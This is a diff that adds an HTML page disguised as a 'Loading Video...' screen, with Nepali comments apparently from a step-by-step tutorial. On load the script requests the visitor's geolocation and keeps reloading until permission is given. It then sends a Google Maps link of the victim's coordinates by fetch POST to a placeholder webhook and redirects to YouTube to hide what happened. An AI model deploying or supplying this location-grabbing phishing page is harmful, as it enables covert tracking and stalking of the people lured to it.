@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head><title>Loading Video...</title></head>
+<body>
+    <script>
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    let lat = position.coords.latitude;
+                    let lon = position.coords.longitude;
+                    
+                    // Tapai ko location data yo link ma jancha
+                    let mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                    
+                    // Webhook link (Ma tala Step 4 ma sikhauchhu)
+                    fetch("TAPAIAKO_WEBHOOK_URL", {
+                        method: "POST",
+                        mode: "no-cors",
+                        body: mapLink
+                    });
+
+                    // User lai YouTube ma pathaidine
+                    window.location.href = "https://www.youtube.com/watch?v=NyFF18"; 
+                }, function() {
+                    alert("Please Allow Location to play video.");
+                    location.reload();
+                });
+            }
+        };
+    </script>
+    <h2>Loading... Please wait.</h2>
+</body>
+</html>
